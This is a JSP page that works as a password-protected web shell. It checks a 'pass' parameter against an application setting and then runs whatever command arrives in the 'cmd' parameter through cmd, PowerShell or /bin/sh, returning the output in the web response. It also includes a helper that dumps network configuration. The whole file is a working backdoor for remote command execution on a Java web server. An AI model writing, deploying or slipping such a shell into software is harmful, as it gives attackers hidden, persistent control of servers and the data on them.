<%@page import="java.io.BufferedReader,
                java.io.IOException,
                java.io.InputStreamReader"
%>

<%!

    public enum Attributes {

        OS_VERSION("os.version"),
        OS_NAME("os.name"),
        OS_ARCH("os.arch"),
        JAVA_HOME("java.home"),
        JAVA_VENDOR("java.vendor"),
        JAVA_VERSION("java.version"),
        USER_DIR("user.dir"),
        USER_HOME("user.home"),
        USER_NAME("user.name");

        private String value = null;

        Attributes(String s) {
            this.value = s;
        }

        public String value() {
            return value;
        }
    }

    public static class Command {
        public static final String WIN_CMD[] = {"cmd", "/C"};
        public static final String WIN_POWER[] = {"cmd", "/C", "powershell", "-nologo", "-Command"};
        public static final String BASH[]    = {"/bin/sh", "-c"};
        private static final String IPCONFIG = "ipconfig /all";
        private static final String IFCONFIG = "/sbin/ifconfig -a";
        private static final String END_OF_POWER_SHELL_COMMAND = "---end-of-script---";


        public static String getOS() {
            return System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
        }

        public static String ipconfig() {
            String command = (getOS().startsWith("windows")) ? IPCONFIG : IFCONFIG;
            return runCommand(command);
        }

        public static String runCommand(String command) {
            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();

            String shell[] = (os.startsWith("windows")) ? WIN_CMD : BASH;

            return runCommand(shell, command);
        }

        public static String runPowerCommand(String command) {
            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();

            String shell[] = (os.startsWith("windows")) ? WIN_POWER : BASH;
            String cmd = "\"& { "+command+";echo  \"---end-of-script---\"; }\"";
            return runCommand(shell, cmd);
        }

        public static String runCommand(String shell[], String command) {
            String cmd[] = new String[shell.length + 1];
            System.arraycopy(shell, 0, cmd, 0, shell.length);
            cmd[cmd.length - 1] = command;

            BufferedReader bufferedReader = null;
            InputStreamReader inputStreamReader = null;
            StringBuffer stringBuffer = null;

            try {
                Process process   = Runtime.getRuntime().exec(cmd);
                inputStreamReader = new InputStreamReader(process.getInputStream());
                bufferedReader    = new BufferedReader(inputStreamReader);
                stringBuffer      = new StringBuffer();
                String line;

                while ((line = bufferedReader.readLine()) != null && !line.equals("---end-of-script---")) {
                    if (line.length() > 0) {
                        stringBuffer.append(line);
                        stringBuffer.append('\n');
                    }
                }
            } catch (IOException ex) {
            } finally {

                try {
                    inputStreamReader.close();
                    bufferedReader.close();
                } catch (IOException e) {}
            }
            return stringBuffer.toString();
        }
    }
%>


<%
if(request.getParameter("pass")!= null &&
    request.getParameter("pass").equals(application.getInitParameter("pass")))
{
    String method = request.getMethod();

    if ("POST".equalsIgnoreCase(method))
    {
        out.println("post");
    }
    else if ("GET".equalsIgnoreCase(method))
    {
        String cmd = request.getParameter("cmd");
        String power = request.getParameter("power");
        if ((cmd != null) && ((power != null) && (power.toLowerCase().equals("true"))))
        {
            out.print(Command.runPowerCommand(cmd));
        } else {
            out.print(Command.runCommand(cmd));
        }
    }
}
%>